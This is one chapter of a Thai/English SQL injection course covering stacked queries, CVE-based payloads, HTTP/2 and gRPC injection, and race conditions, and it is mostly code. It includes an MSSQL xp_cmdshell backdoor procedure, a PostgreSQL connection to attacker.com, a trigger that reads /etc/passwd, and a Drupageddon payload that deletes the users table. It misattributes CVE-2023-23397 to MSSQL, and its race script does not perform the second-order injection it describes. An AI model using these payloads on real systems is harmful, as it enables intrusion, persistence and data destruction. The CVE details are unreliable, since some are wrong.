# Part 095: World-Class SQL Injection Techniques

## ภาพรวม

เทคนิคระดับต้นจากงานวิจัย, CVEs สำคัญ, และเทคนิคไม่รู้จัก

**ขั้นตอนที่ 1496-1510**

---

## 1496. Stacked Queries + Stored Procedures

```sql
-- Stacked queries ใน MSSQL/PostgreSQL:
-- ID = 1; CREATE STORED PROCEDURE...

-- MSSQL: สร้าง backdoor stored procedure
1; CREATE PROCEDURE [dbo].[backdoor] @cmd NVARCHAR(200)
AS EXEC xp_cmdshell @cmd;--

-- เรียกใช้ภายหลัง:
1; EXEC backdoor 'whoami';--

-- PostgreSQL: stacked + DO block
1; DO $$ BEGIN
  PERFORM dblink_connect('host=attacker.com');
END $$;--

-- PostgreSQL: stacked + create trigger (persistent!)
1; CREATE OR REPLACE FUNCTION public.pwned() RETURNS trigger AS
$$ BEGIN PERFORM pg_read_file('/etc/passwd'); RETURN NULL; END; $$ LANGUAGE plpgsql;

CREATE TRIGGER pwned_trigger AFTER INSERT ON users
FOR EACH ROW EXECUTE PROCEDURE public.pwned();--
```

---

## 1497. CVE-Based Techniques

```
Notable CVEs ที่เกี่ยวกับ SQL Injection:

CVE-2014-3704 (Drupageddon):
- Drupal 7 core SQLi
- Array-based injection ใน DB::query
- Payload: ?name[0%20;DELETE%20FROM%20users%20--%20-]=1

CVE-2019-9193 (PostgreSQL COPY TO PROGRAM):
- superuser required
- OS command execution
- Payload: COPY ... TO PROGRAM 'cmd'

CVE-2022-21500 (Oracle):
- Oracle E-Business Suite SQLi
- Critical CVSSv3 9.8

CVE-2023-23397 (MSSQL + SMB):
- Trigger NTLM hash capture
- xp_dirtree → attacker-controlled share

CVE-2023-38646 (Metabase H2 RCE):
- pre-auth SQLi + H2 INIT shell
- No credentials needed
- CVSS 9.8
```

---

## 1498. HTTP/2 และ gRPC Injection

```python
import grpc
import httpx

# gRPC API ที่ถูกเรียกลง DB โดยตรง:
# gRPC -> Python backend -> DB query

# ทดสอบ gRPC ด้วย grpcurl:
# grpcurl -plaintext -d '{"user_id": "1 OR 1=1--"}' localhost:50051 UserService/GetUser

# HTTP/2 multiplexing: ส่งหลาย requests พร้อมกัน
async def http2_parallel_sqli(url: str, payloads: list):
    async with httpx.AsyncClient(http2=True) as client:
        tasks = [
            client.get(url, params={'id': p})
            for p in payloads
        ]
        import asyncio
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        for payload, resp in zip(payloads, responses):
            if isinstance(resp, Exception):
                continue
            if resp.status_code == 200 and len(resp.text) > 100:
                print(f"[+] {payload[:40]}: len={len(resp.text)}")

# HTTP/2 ส่ง 100 payloads พร้อมกัน = faster than HTTP/1.1
```

---

## 1499. Second-Order Race Condition

```python
import threading
import requests

# Race condition + second-order SQLi:
# 1. Register username = "admin'-- -" (stored safely at write-time)
# 2. Race: 2 threads trigger password-change simultaneously
# 3. ถ้า vulnerable code ดึง username มาต่อ SQL โดยตรง -> injection

def race_second_order(url: str, session_token: str):
    results = []
    
    def change_password(new_pass: str):
        r = requests.post(
            f"{url}/change-password",
            data={'new_password': new_pass},
            headers={'Authorization': f'Bearer {session_token}'},
            timeout=5
        )
        results.append(r.status_code)
    
    # Fire 2 requests at the same time
    threads = [
        threading.Thread(target=change_password, args=(f"pass{i}",))
        for i in range(2)
    ]
    
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    print(f"Race results: {results}")

# ถ้า 2 responses แตกต่างกัน อาจมี race condition
```

---

## 1500. โครงสร้างการวิจัยระดับโลก

```
World-Class Research Structure:

การวิจัยระดับบันจาก Portswigger, OWASP, Google Project Zero:

1. THEORY: ทำความเข้าใจ root cause
   - Parser vulnerabilities
   - Lexer edge cases
   - Encoding/charset issues

2. PROOF: สร้าง minimal PoC
   - Isolated test environment
   - Step-by-step reproduction
   - Before/after screenshots

3. IMPACT: quantify ผลกระทบ
   - CVSS score calculation
   - Business impact
   - Affected versions

4. PATCH: เสนอ patch
   - Root cause fix
   - Regression test
   - Migration guide

5. DISCLOSURE: responsible timeline
   - Day 0: Contact vendor
   - Day 7: Confirm receipt
   - Day 90: Public disclosure (or earlier with patch)
   - CVE assignment

Publications:
- Portswigger Web Security Academy research blog
- Google Project Zero blog
- DEF CON/Black Hat presentations
- academic papers (IEEE, USENIX)
```

---

## สรุป

World-Class Techniques:
- **Stacked + Triggers** - persistent backdoors
- **CVE knowledge** - Drupageddon, Metabase RCE
- **HTTP/2 parallel** - faster exploitation
- **Race + Second-order** - timing attacks
- **Research structure** - theory to disclosure

---

*Part 095 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
